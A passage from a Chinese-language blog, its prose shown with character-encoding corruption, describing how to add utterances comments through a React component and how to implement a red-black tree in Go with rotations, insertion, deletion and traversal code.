<pre><code class="language-html">&lt;div id=&quot;content&quot; class=&quot;content&quot;&gt;
    &lt;!-- rendering post content --&gt;
&lt;/div&gt;
&lt;!-- react DOM container --&gt;
&lt;div id=&quot;react-app&quot;&gt;&lt;/div&gt; 
</code></pre>
<p>æˆ‘æŠŠä¸Šé¢è¿™ä¸ªDOM Containeræ”¾åˆ°äº†<code>#content</code>çš„åŒçº§ä½ç½®ï¼Œè®©è¯„è®ºèƒ½åœ¨æ–‡ç« å†…å®¹åº•éƒ¨å‡ºç°ã€‚</p>
<h3 id="step2-add-the-script-tags"><a class="header" href="#step2-add-the-script-tags">Step2: Add the Script Tags</a></h3>
<p>ä¸ºäº†ä½¿ç”¨Reactï¼Œå°±éœ€è¦ä¸€äº›ä¾èµ–è„šæœ¬ï¼Œé¦–å…ˆæ˜¯reactå’Œreact-domã€‚</p>
<p>babelæ˜¯ä¸ºäº†ç¼–è¯‘åŒ…å«JSXè¯­æ³•çš„jsæ–‡ä»¶ï¼ˆpost_footer.jsï¼‰ï¼Œå¦‚æœä¸åŠ babelï¼Œå°±ä¼šå‡ºç°unexpected tokençš„<a href="https://nextjs.org/learn/foundations/from-javascript-to-react/getting-started-with-react">æŠ¥é”™</a>ã€‚</p>
<p>ç¬¬å››ä¸ªscriptå°±æ˜¯å¼•å…¥è‡ªå·±å†™çš„è„šæœ¬ï¼Œè¿™ä¸ªåœ°æ–¹ç”¨äº†handlebarsçš„è¯­æ³•æ¥å¢åŠ æ‰€æœ‰åœ¨book.tomlä¸­é…ç½®çš„additional_jsæ–‡ä»¶ã€‚</p>
<pre><code class="language-handlebars">{{!-- The react --}}
&lt;!-- Load React. --&gt;
&lt;!-- Note: when deploying, replace &quot;development.js&quot; with &quot;production.min.js&quot;. --&gt;
&lt;script src=&quot;https://unpkg.com/react@18/umd/react.development.js&quot; crossorigin&gt;&lt;/script&gt;
&lt;script src=&quot;https://unpkg.com/react-dom@18/umd/react-dom.development.js&quot; crossorigin&gt;&lt;/script&gt;
&lt;!-- Babel Script --&gt;
&lt;script src=&quot;https://unpkg.com/@babel/standalone/babel.min.js&quot;&gt;&lt;/script&gt;
&lt;!-- Custom JS scripts --&gt;
{{#each additional_js}}
&lt;script type=&quot;text/jsx&quot; src=&quot;{{ ../path_to_root }}{{this}}&quot;&gt;&lt;/script&gt;
{{/each}}
</code></pre>
<h3 id="step3-create-a-react-component"><a class="header" href="#step3-create-a-react-component">Step3: Create a React Component</a></h3>
<p>ç”±äºä½¿ç”¨<code>&lt;script&gt;</code>æ–¹å¼å¼•å…¥çš„Reactåœ¨å…¨å±€ä½œç”¨åŸŸä¸­ï¼Œåœ¨post_footer.jsä¸­å°±å¯ä»¥ç›´æ¥ä½¿ç”¨Reactäº†ã€‚
é¦–å…ˆæ‰¾åˆ°è¦ç”¨Reactçš„<code>&lt;div&gt;</code>å®¹å™¨ï¼Œåœ¨è¿™ä¸ªå®¹å™¨ä¸­æ¸²æŸ“è¦åŠ å…¥çš„å…ƒç´ PostFooterã€‚</p>
<pre><code class="language-javascript">const e = React.createElement;

const domContainer = document.querySelector('#react-app');
const root = ReactDOM.createRoot(domContainer);
root.render(e(PostFooter));
</code></pre>
<p>æ¥ç€æ¥å®šä¹‰PostFooterè¿™ä¸ªReact Componentã€‚
é¦–å…ˆå®šä¹‰ç»„æˆPostFooterçš„æ¯ä¸€ä¸ªcommentï¼Œç”¨Reactçš„forwardRefæ¥å®šä¹‰ï¼Œä¼¼ä¹æ˜¯ä¸ºäº†ç»„ä»¶å¤ç”¨ï¼Œåœ¨çˆ¶ç»„ä»¶ä¸­å¼•ç”¨ã€‚</p>
<pre><code class="language-javascript">const Comment = React.forwardRef((props, commentBox) =&gt; {
    return &lt;div ref={commentBox} className=&quot;comments&quot; /&gt;
});
</code></pre>
<p>ä¹‹åå°±ç”Ÿæˆå¼•å…¥utterancesçš„<code>&lt;script&gt;</code>æ ‡ç­¾ã€‚è¯¥æ ‡ç­¾çš„å±æ€§å¯ä»¥æ ¹æ®å½“å‰çš„themeæ”¹å˜ï¼Œæˆ‘è¿™è¾¹æ˜¯ç”¨htmlæ ‡ç­¾çš„classå±æ€§æ˜¯å¦åŒ…å«lightå…³é”®å­—æ¥åˆ¤æ–­çš„ã€‚</p>
<p>å› ä¸ºå¸Œæœ›è¯„è®ºçš„ä¸»é¢˜å’Œåšå®¢çš„ä¸»é¢˜ä¿æŒä¸€è‡´ï¼Œæ‰€ä»¥å¸Œæœ›åœ¨è¿™ä¸ªreactç»„å»ºåŠ è½½çš„æ—¶å€™è¿›è¡Œåˆ¤æ–­ï¼Œå®Œæˆå¯¹åº”çš„è¯„è®ºä¸»é¢˜ç”Ÿæˆã€‚ä½¿ç”¨useEffectæ¥å®Œæˆç»„ä»¶åŠ è½½æ—¶çš„æ‰§è¡Œé€»è¾‘ã€‚
useEffectå‡½æ•°æœ€åè¿”å›çš„æ˜¯ç”¨äºæ¸…ç©ºå½“å‰æ¸²æŸ“å‡ºæ¥çš„ç»„ä»¶çš„ã€‚</p>
<p>è¿™ç§æ–¹æ³•ç°åœ¨åªèƒ½é€šè¿‡åˆ‡æ¢urlæ¥å®Œæˆè¯„è®ºä¸»é¢˜çš„æ›´æ”¹ï¼Œä¸èƒ½åœ¨æ›´æ”¹åšå®¢ä¸»é¢˜æ—¶é©¬ä¸Šæ›´æ”¹è¯„è®ºä¸»é¢˜ã€‚</p>
<pre><code class="language-javascript">const PostFooter = () =&gt; {
    const commentBox = React.createRef();
    const isLight = document.querySelector('html').getAttribute('class').indexOf('light') != -1;
    React.useEffect(() =&gt; {
      const commentScript = document.createElement('script')
      const commentsTheme = isLight ? 'github-light' : 'github-dark'
      commentScript.async = true
      commentScript.src = 'https://utteranc.es/client.js'
      commentScript.setAttribute('repo', 'Sugar-Coder/Sugar-Coder.github.io')
      commentScript.setAttribute('issue-term', 'pathname')
      commentScript.setAttribute('id', 'utterances')
      commentScript.setAttribute('label', 'comment')
      commentScript.setAttribute('theme', commentsTheme)
      commentScript.setAttribute('crossorigin', 'anonymous')
      if (commentBox &amp;&amp; commentBox.current) {
        commentBox.current.appendChild(commentScript)
      } else {
        console.log(`Error adding utterances comments on: ${commentBox}`)
      }

      const removeScript = () =&gt; {
        commentScript.remove();
        document.querySelectorAll(&quot;.utterances&quot;).forEach(el =&gt; el.remove());
      };
      return () =&gt; {
        removeScript();
      };
    }, [])
    return (
      &lt;&gt;
        &lt;Comment ref={commentBox} /&gt;
      &lt;/&gt;
    )
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p><img src="./images/blog20221129/v.png" alt="V" /></p>
<p align="center">Ideas are bulletproof</p>
å›¾æ–‡æ— å…³
<h1 id="çº¢é»‘æ ‘"><a class="header" href="#çº¢é»‘æ ‘">çº¢<span style="color:red;">é»‘</span>æ ‘</a></h1>
<h2 id="motivation"><a class="header" href="#motivation">Motivation</a></h2>
<p>leetcodeä¸Šçš„ç¬¬<a href="https://leetcode.cn/problems/contains-duplicate-iii/">220</a>é¢˜ï¼Œåœ¨æœ‰é™åŒºé—´ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ä¸¤ä¸ªå…ƒç´ çš„çš„å·®å€¼å°äºç­‰äºæŸä¸ªç•Œé™ã€‚</p>
<p>åŸºäºæ»‘åŠ¨çª—å£å’Œæœ‰åºé›†åˆçš„æ€æƒ³ï¼Œå¯ä»¥å¾ˆå¿«çš„å†™å‡º<a href="https://leetcode.cn/submissions/detail/385867183/">è§£ç­”</a>ã€‚ä½†æ˜¯Goè¯­è¨€çš„æ ‡å‡†åº“ä¸­æ²¡æœ‰æœ‰åºé›†çš„æ•°æ®ç»“æ„ï¼Œåªæœ‰å“ˆå¸Œçš„é›†åˆï¼Œå“ˆå¸Œé›†åˆä¸­çš„å…ƒç´ ä¸èƒ½æœ‰åºéå†ï¼Œéš¾ä»¥è·å¾—å€¼ç›¸é‚»å…ƒç´ çš„å·®å€¼ã€‚åˆšå¥½è¿™å‡ å¤©è¢«å°åœ¨å®¿èˆï¼Œæ‰‹å†™ä¸€ä¸ªGoçš„çº¢é»‘æ ‘ã€‚</p>
<h2 id="çº¢é»‘æ ‘çš„æ€§è´¨"><a class="header" href="#çº¢é»‘æ ‘çš„æ€§è´¨">çº¢é»‘æ ‘çš„æ€§è´¨</a></h2>
<ol>
<li>èŠ‚ç‚¹æ˜¯çº¢è‰²æˆ–é»‘è‰²ã€‚</li>
<li>æ ¹æ˜¯é»‘è‰²ã€‚</li>
<li>æ‰€æœ‰å¶å­éƒ½æ˜¯é»‘è‰²ï¼ˆå¶å­æ˜¯NILèŠ‚ç‚¹ï¼‰ã€‚</li>
<li>æ¯ä¸ªçº¢è‰²èŠ‚ç‚¹å¿…é¡»æœ‰ä¸¤ä¸ªé»‘è‰²çš„å­èŠ‚ç‚¹ã€‚ï¼ˆæˆ–è€…è¯´ä»æ¯ä¸ªå¶å­åˆ°æ ¹çš„æ‰€æœ‰è·¯å¾„ä¸Šä¸èƒ½æœ‰ä¸¤ä¸ªè¿ç»­çš„çº¢è‰²èŠ‚ç‚¹ã€‚ï¼‰ï¼ˆæˆ–è€…è¯´ä¸å­˜åœ¨ä¸¤ä¸ªç›¸é‚»çš„çº¢è‰²èŠ‚ç‚¹ï¼Œç›¸é‚»æŒ‡ä¸¤ä¸ªèŠ‚ç‚¹æ˜¯çˆ¶å­å…³ç³»ã€‚ï¼‰ï¼ˆæˆ–è€…è¯´çº¢è‰²èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹å’Œå­èŠ‚ç‚¹å‡æ˜¯é»‘è‰²çš„ã€‚ï¼‰</li>
<li>ä»ä»»ä¸€èŠ‚ç‚¹åˆ°å…¶æ¯ä¸ªå¶å­çš„æ‰€æœ‰ç®€å•è·¯å¾„éƒ½åŒ…å«ç›¸åŒæ•°ç›®çš„é»‘è‰²èŠ‚ç‚¹ã€‚</li>
</ol>
<p><img src="./images/blog20221129/Red-black_tree_example.png" alt="Red-Black Tree" /></p>
<p align="center">Example from <a href="https://zh.m.wikipedia.org/zh-cn/%E7%BA%A2%E9%BB%91%E6%A0%91">Wiki</a></p>
<p>çº¢é»‘æ ‘ä¸Šçš„ä»»ä½•æ“ä½œï¼Œéƒ½æ˜¯ä¸ºäº†ä¿è¯åœ¨çº¢é»‘æ ‘çš„æ€§è´¨ã€‚å¯è§†åŒ–åœ¨<a href="https://www.cs.usfca.edu/%7Egalles/visualization/RedBlack.html">è¿™é‡Œ</a></p>
<h2 id="çº¢é»‘æ ‘çš„æ“ä½œ"><a class="header" href="#çº¢é»‘æ ‘çš„æ“ä½œ">çº¢é»‘æ ‘çš„æ“ä½œ</a></h2>
<blockquote>
<p>çº¢é»‘æ ‘ç›¸å¯¹äºAVLæ ‘æ¥è¯´ï¼Œç‰ºç‰²äº†éƒ¨åˆ†å¹³è¡¡æ€§ä»¥æ¢å–æ’å…¥/åˆ é™¤æ“ä½œæ—¶å°‘é‡çš„æ—‹è½¬æ“ä½œï¼Œæ•´ä½“æ¥è¯´æ€§èƒ½è¦ä¼˜äºAVLæ ‘ã€‚</p>
<p>æ¢å¤çº¢é»‘æ ‘çš„æ€§è´¨éœ€è¦å°‘é‡ï¼ˆ\( O(\log n) \)ï¼‰çš„é¢œè‰²å˜æ›´ï¼ˆå®é™…æ˜¯éå¸¸å¿«é€Ÿçš„ï¼‰å’Œä¸è¶…è¿‡ä¸‰æ¬¡æ ‘æ—‹è½¬ï¼ˆå¯¹äºæ’å…¥æ“ä½œæ˜¯ä¸¤æ¬¡ï¼‰ã€‚è™½ç„¶æ’å…¥å’Œåˆ é™¤å¾ˆå¤æ‚ï¼Œä½†æ“ä½œæ—¶é—´ä»å¯ä»¥ä¿æŒä¸º\( O(\log n) \)æ¬¡</p>
</blockquote>
<p>çº¢é»‘æ ‘æ¯ä¸ªèŠ‚ç‚¹çš„æ•°æ®ç»“æ„åŒ…æ‹¬keyå€¼ï¼ˆvalï¼‰ï¼Œé¢œè‰²å€¼ï¼Œå·¦å³å­©å­æŒ‡é’ˆï¼Œçˆ¶æŒ‡é’ˆã€‚</p>
<pre><code class="language-go">type node struct {
	left, right, parent *node
	val int
	color int
}

const (
	BLACK int = 0
	RED int = 1
)
</code></pre>
<p>éœ€è¦ä¸€äº›å¸®åŠ©å‡½æ•°æ¥å¿«é€ŸæŸ¥æ‰¾èŠ‚ç‚¹çš„å…³ç³»ç½‘ï¼Œç¥–çˆ¶ã€å”å”å’Œå…„å¼Ÿã€‚</p>
<pre><code class="language-go">func (n *node) grandparent() *node {
	return n.parent.parent
}

func (n *node) uncle() *node {
	if n.grandparent().left == n.parent {
		return n.grandparent().right
	} else {
		return n.grandparent().left
	}
}

func (n *node) sibling() *node {
	if n == n.parent.left {
		return n.parent.right
	} else {
		return n.parent.left
	}
}
</code></pre>
<p>æ•´ä¸ªæ ‘ç»“æ„å¦‚ä¸‹ï¼Œé™¤äº†æ ¹èŠ‚ç‚¹å¤–è¿˜è®¾ç½®äº†ä¸€ä¸ªNilï¼Œå³æ•´æ£µæ ‘çš„å¶å­ç»“ç‚¹çš„ä»£è¡¨ï¼Œé™ä½ç©ºé—´æ¶ˆè€—</p>
<pre><code class="language-go">type RBTree struct {
	root *node
	Nil *node
}

func NewRBTree() *RBTree {
	T := &amp;RBTree{
		Nil: &amp;node{
			color: BLACK,
		},
	}
	T.root = T.Nil
	T.root.parent = T.Nil
	return T
}
</code></pre>
<h3 id="æ—‹è½¬æ“ä½œ"><a class="header" href="#æ—‹è½¬æ“ä½œ">æ—‹è½¬æ“ä½œ</a></h3>
<p>å½“èŠ‚ç‚¹æ˜¯çˆ¶èŠ‚ç‚¹çš„å³å„¿å­æ—¶ï¼Œè¯¥èŠ‚ç‚¹å¯è¿›è¡Œ<em>å·¦æ—‹</em>æ“ä½œã€‚</p>
<pre><code class="language-go">// æ—‹è½¬å‰æˆ‘æ˜¯å³å„¿å­
// çˆ¹å˜æˆæˆ‘çš„å·¦å„¿å­ï¼Œæˆ‘å˜æˆçˆ¹çš„çˆ¹
func (tree *RBTree) rotateLeft(n *node) {
	parent := n.parent
	if parent == tree.Nil {
		tree.root = n
		return
	}
	gp := n.grandparent()
	parent.right = n.left
	if n.left != tree.Nil {
		n.left.parent = parent
	}
	parent.parent = n
	n.left = parent
	if tree.root == parent {
		tree.root = n
	}
	n.parent = gp
	// modify connection with grandparent
	if gp != tree.Nil {
		if parent == gp.left {
			gp.left = n
		} else {
			gp.right = n
		}
	}
}
</code></pre>
<p>å½“ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å…¶çˆ¶èŠ‚ç‚¹çš„å·¦å„¿å­æ—¶ï¼Œè¯¥èŠ‚ç‚¹å¯è¿›è¡Œ<em>å³æ—‹</em>æ“ä½œã€‚</p>
<pre><code class="language-go">// æ—‹è½¬å‰æˆ‘æ˜¯å·¦å„¿å­
// æˆ‘çš„çˆ¹å˜æˆæˆ‘çš„å³å„¿å­
func (tree *RBTree) rotateRight(n *node) {
	parent := n.parent
	gp := n.grandparent()
	
	parent.left = n.right
	if n.right != tree.Nil {
		n.right.parent = parent
	}
	n.right = parent
	n.parent = gp
	parent.parent = n
	// æ›´æ¢æ ¹èŠ‚ç‚¹
	if parent == tree.root {
		tree.root = n
	}
	// æ›´æ–°ç¥–çˆ¶èŠ‚ç‚¹çš„å­©å­æŒ‡é’ˆ
	if gp != tree.Nil {
		if parent == gp.left {
			gp.left = n
		} else {
			gp.right = n
		}
	}
}
</code></pre>
<h3 id="æœç´¢"><a class="header" href="#æœç´¢">æœç´¢</a></h3>
<p>å¦‚æœæ²¡æ‰¾åˆ°ï¼Œå°±ä¼šè¿”å›<code>Nil</code>ã€‚</p>
<pre><code class="language-go">func (tree *RBTree) RBSearch(val int) *node {
	tmp := tree.root
	for tmp != tree.Nil {
		if val &lt; tmp.val {
			tmp = tmp.left
		} else if val &gt; tmp.val {
			tmp = tmp.right
		} else {
			return tmp
		}
	}
	return tmp
}
</code></pre>
<h3 id="æ’å…¥"><a class="header" href="#æ’å…¥">æ’å…¥</a></h3>
<p>é¦–å…ˆè¦æ‰¾æ’å…¥å€¼çš„ä½ç½®ï¼Œæ‰¾åˆ°ä½ç½®åï¼Œå°†å¸¦æ’å…¥ç‚¹ä½œä¸ºæ–°èŠ‚ç‚¹çš„çˆ¶äº²ï¼Œå†å¯¹çº¢é»‘æ ‘è¿›è¡Œè°ƒæ•´ã€‚
å°†æ’å…¥çš„èŠ‚ç‚¹è®¾ç½®ä¸ºçº¢è‰²ï¼Œå°½å¯èƒ½ä¸ç ´åæ€§è´¨5ã€‚</p>
<pre><code class="language-go">func (tree *RBTree) RBInsert(val int) {
	new_node := &amp;node{
		val: val, 
		color: RED, // ä¿è¯æ€§è´¨5
		left: tree.Nil, 
		right: tree.Nil,
	}
	// æ‰¾çˆ¹
	var prev, cur *node = tree.Nil, tree.root
	for cur != tree.Nil {
		prev = cur
		if val &gt; cur.val {
			cur = cur.right
		} else {
			cur = cur.left
		}
	}
	// connect
	new_node.parent = prev
	if prev == tree.Nil {
		tree.root = new_node
	} else if new_node.val &lt; prev.val {
		prev.left = new_node
	} else {
		prev.right = new_node
	}
	// adjust
	tree.insert_case1(new_node)
}
</code></pre>
<p>å¯¹çº¢é»‘æ ‘çš„æ’å…¥è°ƒæ•´å¦‚ä¸‹</p>
<pre><code class="language-go">func (tree *RBTree) insert_case1(n *node) {
	if n.parent == tree.Nil {
		// å¾…æ’å…¥ç‚¹æ˜¯æ ¹èŠ‚ç‚¹
		n.color = BLACK
	} else {
		tree.insert_case2(n)
	}
}

func (tree *RBTree) insert_case2(n *node) {
	if n.parent.color == BLACK {
		// çº¢é»‘æ ‘çš„æ€§è´¨ä»ç„¶æ»¡è¶³
		return
	} else {
		// çˆ¶èŠ‚ç‚¹æ˜¯çº¢è‰²çš„ï¼Œä¸èƒ½ç›´æ¥æ’ä¸€ä¸ªæ–°çš„REDèŠ‚ç‚¹
		tree.insert_case3(n)
	}
}

func (tree *RBTree) insert_case3(n *node) {
	if n.uncle() != tree.Nil &amp;&amp; n.uncle().color == RED {
		// å”å”ä¹Ÿæ˜¯çº¢çš„
		n.parent.color = BLACK
		n.uncle().color = BLACK
		n.grandparent().color = RED // é‡æ–°ç»˜åˆ¶é¢œè‰²ä¸è®©çº¢è‰²èŠ‚ç‚¹ç›¸é‚»
		tree.insert_case1(n.grandparent()) // é€’å½’è°ƒæ•´
	} else {
		tree.insert_case4(n)
	}
}

func (tree *RBTree) insert_case4(n *node) {
	// uncleæ˜¯é»‘çš„æˆ–è€…ä¸å­˜åœ¨
	if n == n.parent.right &amp;&amp; n.parent == n.grandparent().left {
		// n æ˜¯å³å­©å­ï¼Œparentæ˜¯å·¦å­©å­, å½¢ä¼¼ ã€Š
		tree.rotateLeft(n) // ä½¿å¾—ç¥–å­™ä¸‰ä»£å˜æˆ â€˜//â€™
		n = n.left
	} else if n == n.parent.left &amp;&amp; n.parent == n.grandparent().right {
		// å½¢ä¼¼ ã€‹
		tree.rotateRight(n) // ä½¿å¾—ç¥–å­™ä¸‰ä»£å˜æˆ â€˜\\â€™
		n = n.right
	}
	tree.insert_case5(n)
}

func (tree *RBTree) insert_case5(n *node) {
	n.parent.color = BLACK
	n.grandparent().color = RED
	// è®©çˆ¹å½“çˆ·çˆ·, çˆ·çˆ·å˜æˆè‡ªå·±çš„å…„å¼Ÿ
	if n == n.parent.left &amp;&amp; n.parent == n.grandparent().left {
		tree.rotateRight(n.parent)
	} else {
		tree.rotateLeft(n.parent)
	}
}
</code></pre>
<h3 id="åˆ é™¤"><a class="header" href="#åˆ é™¤">åˆ é™¤</a></h3>
<p>çº¢é»‘æ ‘çš„åˆ é™¤çš„æ€æƒ³æ˜¯å°†ç‰¹æ®Šæƒ…å†µè½¬ä¸ºä¸€èˆ¬æƒ…å†µã€‚</p>
<p>é¦–å…ˆæ‰¾åˆ°å¾…åˆ é™¤çš„èŠ‚ç‚¹ï¼Œå¦‚æœèŠ‚ç‚¹æœ‰ä¸¤ä¸ªå­©å­ï¼Œé‚£ä¹ˆå°±æ‰¾å³å­æ ‘ä¸­çš„æœ€å°å€¼æ¥æ›¿æ¢è‡ªå·±çš„å€¼ï¼Œå†åˆ é™¤è¿™ä¸ªå³å­æ ‘æœ€å°å€¼èŠ‚ç‚¹ï¼ˆæ­¤èŠ‚ç‚¹ä¸€å®šä¸ä¼šæœ‰ä¸¤ä¸ªå­©å­ï¼‰ã€‚
å³åªç”¨è€ƒè™‘åˆ é™¤åªæœ‰ä¸€ä¸ªå­©å­çš„æƒ…å†µï¼Œå¦‚æœä¸¤ä¸ªå­©å­éƒ½ä¸ºç©ºï¼Œå¯ä»¥è®¤ä¸ºæœ‰ä¸€ä¸ªé»‘è‰²çš„å­©å­<code>Nil</code>ã€‚</p>
<pre><code class="language-go">func (tree *RBTree) RBDelete(val int) bool {
	node := tree.RBSearch(val)
	if node == tree.Nil {
		return false
	}
	if node.right == tree.Nil {
		tree.delete_one_child(node)
	} else {
		replacer := tree.getSmallestChild(node.right) // æ‰¾åˆ°éNilå¶å­èŠ‚ç‚¹
		replacer.val, node.val = node.val, replacer.val // å°†replacerèŠ‚ç‚¹ä¸Šç§»
		tree.delete_one_child(replacer)
	}
	return true
}


func (tree *RBTree) delete_one_child(n *node) {
	// n only has one child
	var child *node
	if n.left == tree.Nil {
		child = n.right
	} else {
		child = n.left
	}
	// delete the last element in the tree
	if n.parent == tree.Nil &amp;&amp; n.left == tree.Nil &amp;&amp; n.right == tree.Nil {
		n = tree.Nil
		tree.root = n
		return
	}
	// if node is root
	if n.parent == tree.Nil {
		child.parent = tree.Nil
		tree.root = child
		tree.root.color = BLACK // æ ¹ä¸€å®šæ˜¯é»‘çš„ï¼Œåˆ äº†ä¸€ä¸ªæ ¹ï¼Œè¦è¡¥ä¸€ä¸ªé»‘èŠ‚ç‚¹
		return
	}
	// remove the node n between parent and child
	if n.parent.left == n {
		n.parent.left = child
	} else {
		n.parent.right = child
	}
	child.parent = n.parent

	// å¯¹childè¿›è¡Œè°ƒæ•´ï¼Œè®©åˆ é™¤nä¹‹åï¼Œçº¢é»‘æ ‘çš„æ€§è´¨ä¾æ—§èƒ½ä¿æŒ
	if n.color == BLACK {
		if child.color == RED {
			child.color = BLACK // ä¿è¯æ€§è´¨5ï¼Œè¡¥å……ä¸€ä¸ªé»‘èŠ‚ç‚¹
		} else {
			// childä¹Ÿæ˜¯é»‘è‰²
			tree.delete_case1(child)
		}
	} else {
		// else n.color == RED
	}
	// çº¢è‰²èŠ‚ç‚¹nç›´æ¥åˆ é™¤å³å¯ï¼Œchildæ›¿ä»£ä¹‹åï¼Œä¸æ”¹å˜æ ‘æä¸Šé»‘è‰²èŠ‚ç‚¹çš„æ•°é‡
}

func (tree *RBTree) delete_case1(n *node) {
	if n.parent != tree.Nil {
		tree.delete_case2(n)
	}
	// næ˜¯æ–°æ ¹ï¼Œç›´æ¥è¿”å›å³å¯
}

func (tree *RBTree) delete_case2(n *node) {
	s := n.sibling()
	if s.color == RED {
		n.parent.color = RED
		s.color = BLACK
		// è®©å…„å¼Ÿså½“ä½œn.parentçš„çˆ¶äº²
		if n == n.parent.left {
			tree.rotateLeft(s)
		} else {
			tree.rotateRight(s)
		}
	}
	// æ­¤æ—¶nå’Œsçš„å…¶ä¸­ä¸€ä¸ªå„¿å­åšå…„å¼Ÿï¼Œä½†æ˜¯è·¯å¾„ä¸Šçš„å„¿å­æ•°é‡ä¸ç›¸ç­‰ï¼ˆæ¯”æœ‰nçš„è·¯å¾„å¤šä¸€ä¸ªé»‘èŠ‚ç‚¹ï¼‰ï¼Œç»§ç»­è°ƒæ•´
	tree.delete_case3(n)
}

func (tree *RBTree) delete_case3(n *node) {
	s := n.sibling()
	if s.color == BLACK &amp;&amp; n.parent.color == BLACK &amp;&amp; s.left.color == BLACK &amp;&amp; s.right.color == BLACK {
		s.color = RED // å‡å°‘ä¸€ä¸ªé»‘èŠ‚ç‚¹
		// æ­¤æ—¶é€šè¿‡n.parentçš„è·¯å¾„ä¸Šçš„é»‘è‰²èŠ‚ç‚¹æ•°é‡éƒ½ç›¸ç­‰äº†ï¼Œ
		// ä½†æ˜¯å¯¹äºä»parentå¼€å§‹çš„è·¯å¾„æ¥è¯´ï¼Œæ‰€æœ‰è·¯å¾„ä¸Šçš„é»‘èŠ‚ç‚¹æ€»æ•°é‡å°‘äº†1ï¼ˆç›¸æ¯”parentçš„siblingï¼‰
		// è¿˜éœ€è¦é€’å½’è°ƒæ•´parent
		tree.delete_case1(n.parent)
	} else {
		tree.delete_case4(n)
	}
}

func (tree *RBTree) delete_case4(n *node) {
	s := n.sibling()
	// nçš„çˆ¶äº²æ˜¯çº¢çš„ï¼Œså’Œsçš„ä¸¤ä¸ªå„¿å­éƒ½æ˜¯é»‘çš„
	if n.parent.color == RED &amp;&amp; s.color == BLACK &amp;&amp; s.left.color == BLACK &amp;&amp; s.right.color == BLACK {
		n.parent.color = BLACK
		s.color = RED
	} else {
		tree.delete_case5(n)
	}
}

func (tree *RBTree) delete_case5(n *node) {
	s := n.sibling()
	if s.color == BLACK { // ä¸€ä¸ªç®€åŒ–äº†çš„æ¡ä»¶ï¼Œs.child must be black due to the delete case2
		if n == n.parent.left &amp;&amp; s.right.color == BLACK &amp;&amp; s.left.color == RED {
			s.color = RED
			s.left.color = BLACK
			tree.rotateRight(s.left)
		} else if n == n.parent.right &amp;&amp; s.right.color == RED &amp;&amp; s.left.color == BLACK {
			s.color = RED
			s.right.color = BLACK
			tree.rotateLeft(s.right)
		}
	}
	tree.delete_case6(n)
}

// todo
func (tree *RBTree) delete_case6(n *node) {
	s := n.sibling()
	s.color = n.parent.color
	n.parent.color = BLACK

	if n == n.parent.left {
		s.right.color = BLACK
		tree.rotateLeft(s)
	} else {
		s.left.color = BLACK
		tree.rotateRight(s)
	}
}
</code></pre>
<h3 id="å…¶ä»–çš„æ“ä½œ"><a class="header" href="#å…¶ä»–çš„æ“ä½œ">å…¶ä»–çš„æ“ä½œ</a></h3>
<h4 id="å±‚åºéå†"><a class="header" href="#å±‚åºéå†">å±‚åºéå†</a></h4>
<p>ç”¨é˜Ÿåˆ—è®°å½•å½“å‰å±‚çš„èŠ‚ç‚¹</p>
<pre><code class="language-go">func (tree *RBTree) LevelOrderTraversalPrint() {
	queue := []*node{}
	if tree.root == tree.Nil {
		fmt.Printf(&quot;Nil\n&quot;)
		return
	}
	queue = append(queue, tree.root)
	for len(queue) &gt; 0 {
		count := len(queue)
		for i := 0; i &lt; count; i++ {
			n := queue[i]
			if n == tree.Nil {
				fmt.Printf(&quot;Nil &quot;)
			} else {
				fmt.Printf(&quot;%v:%d &quot;, n.color, n.val)
				queue = append(queue, n.left)
				queue = append(queue, n.right)
			}
		}
		queue = queue[count:]
		fmt.Println(&quot;&quot;)
	}
}
</code></pre>
<h4 id="æ‰¾ä¸€ä¸ªèŠ‚ç‚¹çš„å‰ç»§å’Œåç»§"><a class="header" href="#æ‰¾ä¸€ä¸ªèŠ‚ç‚¹çš„å‰ç»§å’Œåç»§">æ‰¾ä¸€ä¸ªèŠ‚ç‚¹çš„å‰ç»§å’Œåç»§</a></h4>
<p>è¿™ä¸¤ä¸ªå‡½æ•°å¯¹äºæŸ¥æ‰¾ç›¸é‚»èŠ‚ç‚¹çš„å·®å€¼éå¸¸æœ‰ç”¨ï¼Œåœ¨å®ç°leecode220é¢˜æ—¶ï¼Œéœ€è¦åœ¨æ ‘çš„æ›´æ–°åï¼Œç”¨äºæ¯”è¾ƒå½“å‰æ’å…¥çš„å€¼çš„å‰ç»§å’Œåç»§ã€‚</p>
<pre><code class="language-go">// è·å–æŒ‰ä»å°åˆ°å¤§æ’åºåçš„valå€¼çš„å‰åº
func (tree *RBTree) GetPredecessor(val int) *node {
	n := tree.RBSearch(val)
	if n == tree.Nil {
		return n
	}
	if n.left != tree.Nil {
		return tree.getBiggestChild(n.left)
	}
	// æŸ¥æ‰¾çˆ¶èŠ‚ç‚¹ï¼Œç›´åˆ°æ‰¾åˆ°å€¼å°äºn
	p := n.parent
	for p != tree.Nil &amp;&amp; n == p.left { // å¦‚æœnæ˜¯parentçš„å·¦å­©å­ï¼Œç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°nilæˆ–è€…å‘ç°äº†ä¸ªè½¬æŠ˜ç‚¹ï¼Œè¿™ä¸ªç‚¹çš„valueä¸€å®šå°äºn
		n = p
		p = p.parent
	}
	return p
}

func (tree *RBTree) getBiggestChild(n *node) *node {
	p, c := tree.Nil, n
	for c != tree.Nil {
		p = c
		c = c.right
	}
	return p
}

// è·å–æŒ‰ä»å°åˆ°å¤§æ’åºåçš„valå€¼çš„åç»­
func (tree *RBTree) GetSuccessor(val int) *node {
	n := tree.RBSearch(val)
	if n == tree.Nil {
		return n
	}
	if n.right != tree.Nil {
		return tree.getSmallestChild(n.right)
	}
	p := n.parent
	for p != tree.Nil &amp;&amp; n == p.right {
		n = p
		p = p.parent
	}
	return p
}

// æ‰¾åˆ°ä»¥nä¸ºæ ¹çš„æ ‘ä¸­æœ€å°å€¼èŠ‚ç‚¹
func (tree *RBTree) getSmallestChild(n *node) *node {
	p, s := tree.Nil, n
	for s != tree.Nil {
		p = s
		s = s.left
	}
	return p
}
</code></pre>
<p>å®Œæ•´ä»£ç å¯è§<a href="https://gitee.com/sugarcoder/leetcode-go/tree/master/tree">gitee</a></p>
<p>END</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="btree"><a class="header" href="#btree">B+Tree</a></h1>
